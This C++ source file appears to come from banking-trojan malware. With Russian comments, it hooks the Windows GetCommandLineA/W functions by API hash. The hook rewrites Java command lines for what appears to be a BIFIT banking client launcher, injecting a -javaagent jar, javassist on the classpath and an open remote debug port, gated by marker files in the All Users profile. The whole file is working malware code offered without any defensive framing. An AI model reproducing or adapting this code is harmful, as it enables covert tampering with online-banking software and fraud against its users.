#include "CmdLine.h"
#include "GetApi.h"
#include "Utils.h"
#include "Memory.h"
#include "Strings.h"
#include "Splice.h"

#include "BotDebug.h"

namespace CMDLINEDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define DBG CMDLINEDEBUGSTRINGS::DBGOutMessage<>

typedef PCHAR  (WINAPI *PGetCommandLineA)(VOID);
typedef PWCHAR (WINAPI *PGetCommandLineW)(VOID);

const DWORD Hash_GetCommandLineA = 0xFB0730C;
const DWORD Hash_GetCommandLineW = 0xFB0731A;

PGetCommandLineA Real_GetCommandLineA;
PGetCommandLineW Real_GetCommandLineW;

char* InsertString( char* s, int c_s, const char* ins, int c_ins, char* to )
{
	char* end1 = s + c_s;
	char* end2 = end1 + c_ins; //новый конец строки
	while( end1 >= to )
		*end2-- = *end1--;
	while( c_ins-- ) 
		*to++ = *ins++;
	return s;
}


PCHAR WINAPI Hook_GetCommandLineA()
{
	PCHAR CommandLineA = Real_GetCommandLineA();


	char find1[] = { '-','X','m','x','2','5','6','m', 0 }; //-Xmx256m
	char find2[] = { '-','c','p',' ','l','a','u','n','c','h','e','r','.','j','a','r', 0 }; //-cp launcher.jar
	char find3[] = { '-','X','b','o','o','t','c','l','a','s','s','p','a','t','h', 0 }; //-Xbootclasspath
	char find4[] = {'-','D','j','a','v','a', 0};

	const char* agent = "Agent.jar";
	const char* agentPassive = "AgentPassive.jar";
//	const char* forIns1 = " -javaagent:\"%s\\%s\""; 
	const char* forIns1 = " -Xdebug -Xrunjdwp:transport=dt_socket,server=y,address=9999 -javaagent:\"%s\\%s\""; 
	const char* forIns2 = ";\"%s\\Agent.jar\";\"%s\\lib\\javassist.jar\"";//;\"%s\\lib\\client2015.jar\"";
	DBG("CmdLineA", "----: %s", CommandLineA);
	if( m_strstr( CommandLineA, "javassist.jar" ) != 0 ) //если уже добавляли, то 2-й раз не нужно
		return CommandLineA;

	char* p1 = m_strstr( CommandLineA, find1 );
	if( p1 == 0 ) return CommandLineA; //ненаша строка
	MemPtr<MAX_PATH> allUsers;
	GetAllUsersProfile( allUsers.str(), allUsers.size() );
	MemPtr<MAX_PATH> uidTxt;
	m_lstrcpy( uidTxt, allUsers );
	m_lstrcat( uidTxt, "\\uid.txt" );
	if( (DWORD)pGetFileAttributesA(uidTxt.str()) == INVALID_FILE_ATTRIBUTES ) //если файла нет, то ничего не делаем
		return CommandLineA;

	int lenCmd = m_lstrlen(CommandLineA);
	MemPtr<MAX_PATH + MAX_PATH> ins1;
	MemPtr<MAX_PATH + MAX_PATH> ins2;
	fwsprintfA pwsprintfA = Get_wsprintfA();
	char* p2 = m_strstr( CommandLineA, find3 );
	if( p2 ) //онлайн версия
	{
/*
"C:\Program Files\Java\jre6\bin\java.exe" -D__jvm_launched=3425703260 
-Xbootclasspath/a:C:\PROGRA~1\Java\jre6\lib\deploy.jar;C:\PROGRA~1\Java\jre6\lib\javaws.jar;C:\PROGRA~1\Java\jre6\lib\plugin.jar 
-Djava.class.path=C:\PROGRA~1\Java\jre6\classes -Dsun.awt.warmup=true 
-Xmx256m sun.plugin2.main.client.PluginMain write_pipe_name=jpi2_pid2968_pipe3,read_pipe_name=jpi2_pid2968_pipe2
*/
		/*
		DBG("CmdLineA", "before: %s", CommandLineA);
		DWORD sz;
		char* ptr = (char*)File::ReadToBufferA( "C:\\onlineHook.txt", sz );
		if( ptr )
		{
			ptr[sz] = 0;
			m_lstrcpy( CommandLineA, ptr );
			MemFree(ptr);
		}
		*/
		p2 = p1;
		p1 = m_strstr( CommandLineA, find4 );
		if( p1 )
		{
			MemPtr<3 * MAX_PATH> mem;
			char* passiveDat = mem.str();
			char* agentStartedDat = mem.str() + MAX_PATH;
			char* agentWorkingDat = mem.str() + 2 * MAX_PATH;
			m_lstrcpy( passiveDat, allUsers.str() ); pPathAppendA( passiveDat, "passive.dat" );
			m_lstrcpy( agentStartedDat, allUsers.str() ); pPathAppendA( agentStartedDat, "agentStarted.dat" );
			m_lstrcpy( agentWorkingDat, allUsers.str() ); pPathAppendA( agentWorkingDat, "agentWorking.dat" );
			const char* a = agent;
			if( File::IsExists(agentStartedDat) && !File::IsExists(agentWorkingDat) )
				agent = 0;
			else
				if( File::IsExists(passiveDat) )
					agent = agentPassive;
			//вставка "-javaagent:C:\ProgramData\Agent.jar "
			int sz1 = a ? pwsprintfA( ins1, forIns1, allUsers.str(), a ) : 0;
			//вставка ";C:\ProgramData\Agent.jar;C:\ProgramData\lib\javassist.jar"
			int sz2 = pwsprintfA( ins2, forIns2, allUsers.str(), allUsers.str() );//, allUsers.str() );
			InsertString( CommandLineA, lenCmd, ins2, sz2, p1 - 1 );
			lenCmd += sz2; p2 += sz2;
			p2 += sizeof(find1) - 1;
			if( a ) InsertString( CommandLineA, lenCmd, ins1, sz1, p2 );
			//m_lstrcat( CommandLineA, ins1 );
		}
	}
	else
	{
//	"C:\Program Files\Java\jre1.6.0_10\bin\javaw.exe" -Xmx256m -cp launcher.jar com.bifit.launcher.Launcher
// --------------
//"C:\Program Files\Java\jre1.6.0_10\bin\javaw.exe" -Xmx256m -javaagent:C:\ProgramData\Agent.jar 
//       -cp launcher.jar;C:\ProgramData\Agent.jar;C:\ProgramData\lib\javassist.jar com.bifit.launcher.Launcher

		p2 = m_strstr( CommandLineA, find2 );
		if( p2 ) //оффлайн версия
		{		
			if( m_strstr( CommandLineA, "javassist.jar" ) == 0 ) //если уже добавляли, то 2-й раз не нужно
			{
				//вставка "-javaagent:C:\ProgramData\Agent.jar "
				int sz1 = pwsprintfA( ins1, forIns1, allUsers.str(), agentPassive );
				//вставка ";C:\ProgramData\Agent.jar;C:\ProgramData\lib\javassist.jar"
				int sz2 = pwsprintfA( ins2, forIns2, allUsers.str(), allUsers.str() );//, allUsers.str() );
				int lenCmd = m_lstrlen(CommandLineA);
				p1 += sizeof(find1) - 1;
				InsertString( CommandLineA, lenCmd, ins1, sz1, p1 );
				lenCmd += sz1; p2 += sz1;
		
				p2 += sizeof(find2) - 1;
				InsertString( CommandLineA, lenCmd, ins2, sz2, p2 );
			}
		}
	}
	DBG("CmdLineA", "after: %s", CommandLineA);
	return CommandLineA;
};

PWCHAR WINAPI Hook_GetCommandLineW()
{
	PWCHAR CommandLineW = Real_GetCommandLineW();
	
	DBG("CmdLineW", CommandLineW);
	/*
	if ( m_wcsstr(CommandLineW, L"AgentTest.jar") && m_wcsstr(CommandLineW, L"-jar"))
	{
		return pMyCommandLineW;
	}
	*/
	return CommandLineW;
};

bool HookCmdLine() 
{
	DBG("CmdLine", "Перехват функций API");
	if ( HookApi( DLL_KERNEL32, Hash_GetCommandLineA, &Hook_GetCommandLineA ) )
	{  
		__asm mov [Real_GetCommandLineA], eax			
	}	

	if ( HookApi( DLL_KERNEL32, Hash_GetCommandLineW, &Hook_GetCommandLineW ) )
	{  
		__asm mov [Real_GetCommandLineW], eax			
	}

	DBG("CmdLine", "Хуки стоят");
	return true;
}

